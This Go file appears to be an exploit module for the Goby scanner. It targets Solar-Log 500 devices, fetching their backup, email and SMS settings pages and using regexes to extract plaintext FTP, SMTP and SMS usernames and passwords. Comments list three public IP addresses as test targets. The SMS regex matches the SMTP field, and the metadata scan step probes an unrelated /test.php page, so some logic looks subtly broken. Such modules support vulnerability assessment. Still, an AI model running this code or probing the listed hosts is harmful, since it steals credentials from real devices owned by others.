package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"regexp"
	"strings"
)

func init() {

	//这个漏洞可以获取 Solar-Log 设备上配置的各种明文账户比如FTP/SMTP，Solar-Log

	expJson := `{
    "Name": "Solar-Log incorrect access control infoleak",
    "Description": " An issue was discovered in Solar-Log 500 prior to 2.8.2 Build 52 - 23.04.2013.For Example,In /export.html, email.html, sms.html, backup.html,the devices store plaintext passwords,which may allow sensitive information to be read by someone with access to the device.",
    "Product": "Solar-Log",
    "Homepage": "https://www.solar-log.com",
    "DisclosureDate": "2021-06-15",
    "Author": "i_am_ben@qq.com",
    "FofaQuery": "server=\"IPC@CHIP\"",
    "GobyQuery": "server=\"IPC@CHIP\"",
    "Level": "2",
    "Impact": "<p>Get the Solar-Log devices store plaintext passwords.</p>",
    "Recommendation": "<p>undefined</p>",
    "References": [
        "https://cxsecurity.com/issue/WLB-2021060060",
        "https://cxsecurity.com/issue/WLB-2021060059"
    ],
    "HasExp": true,
    "ExpParams": null,
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": null,
    "Tags": [
        "infoleak"
    ],
    "CVEIDs": null,
    "CVSSScore": null,
    "AttackSurfaces": {
        "Application": [
            "Solar-Log"
        ],
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10223"
}`

	//测试地址：http://217.92.78.33:81/
	//测试地址：http://212.110.197.223:81/
	//测试地址：http://46.28.127.141:9090/

	ExpManager.AddExploit(NewExploit(

		goutils.GetFileName(),
		expJson,

		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			pocUri := "/backup.html" // 查看系统备份设置页面是否可以正常访问并存在相关Solar-log指纹
			if resp, err := httpclient.SimpleGet(u.FixedHostInfo + pocUri); err == nil {
				return resp.StatusCode == 200 && strings.Contains(resp.RawBody, "var AnlagenKWP=") && strings.Contains(resp.RawBody, "var Boot=")
			}
			return false
		},

		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			ftpAccountUri := "/backup.html"
			smtpAccountUri := "/email.html"
			smsAccountUri := "/sms.html"
			ftpResp, _ := httpclient.SimpleGet(expResult.HostInfo.FixedHostInfo + ftpAccountUri)
			smtpResp, _ := httpclient.SimpleGet(expResult.HostInfo.FixedHostInfo + smtpAccountUri)
			smsResp, _ := httpclient.SimpleGet(expResult.HostInfo.FixedHostInfo + smsAccountUri)
			if ftpResp.StatusCode == 200 && smtpResp.StatusCode == 200 && smsResp.StatusCode == 200 {
				expResult.Success = true
				//开始提取明文账户信息，主要有三个 ftp/smtp/sms
				// ftp
				regFtp := regexp.MustCompile(`id="ftp"(?s:(.*?))value="(?s:(.*?))"(?s:(.*?))id="user"(?s:(.*?))value="(?s:(.*?))"(?s:(.*?))id="password"(?s:(.*?))value="(?s:(.*?))"(?s:(.*?))id="dir"(?s:(.*?))value="(?s:(.*?))"`)
				resultFtp := regFtp.FindAllStringSubmatch(ftpResp.RawBody, -1)
				for _, text := range resultFtp {
					expResult.Output = "[FTP Credentials]" + "\n" + "host server: " + text[len(text)-10] + "\n" + "username: " + text[len(text)-7] + "\n" + "password: " + text[len(text)-4] + "\n" + "dir path: " + text[len(text)-1] + "\n"
				}

				//smtp
				regSmtp := regexp.MustCompile(`id="smtp"(?s:(.*?))value="(?s:(.*?))"(?s:(.*?))id="user"(?s:(.*?))value="(?s:(.*?))"(?s:(.*?))id="password"(?s:(.*?))value="(?s:(.*?))"(?s:(.*?))id="email_von"(?s:(.*?))value="(?s:(.*?))"(?s:(.*?))id="email_nach"(?s:(.*?))value="(?s:(.*?))"`)
				resultSmtp := regSmtp.FindAllStringSubmatch(smtpResp.RawBody, -1)
				for _, text := range resultSmtp {
					expResult.Output += "[SMTP Credentials]" + "\n" + "smtp server: " + text[len(text)-13] + "\n" + "username: " + text[len(text)-10] + "\n" + "password: " + text[len(text)-7] + "\n" + "email from: " + text[len(text)-4] + "\n" + "email to: " + text[len(text)-1] + "\n"
				}

				//sms
				regSms := regexp.MustCompile(`id="smtp"(?s:(.*?))value="(?s:(.*?))"(?s:(.*?))id="user"(?s:(.*?))value="(?s:(.*?))"(?s:(.*?))id="password"(?s:(.*?))value="(?s:(.*?))"`)
				resultSms := regSms.FindAllStringSubmatch(smsResp.RawBody, -1)
				for _, text := range resultSms {
					expResult.Output += "[SMS Credentials]" + "\n" + "sms server: " + text[len(text)-7] + "\n" + "username: " + text[len(text)-4] + "\n" + "password: " + text[len(text)-1] + "\n"
				}

			} else {
				expResult.Success = false
				expResult.Output = "An error occurred while accessing the target html page."
			}

			return expResult
		},
	))
}
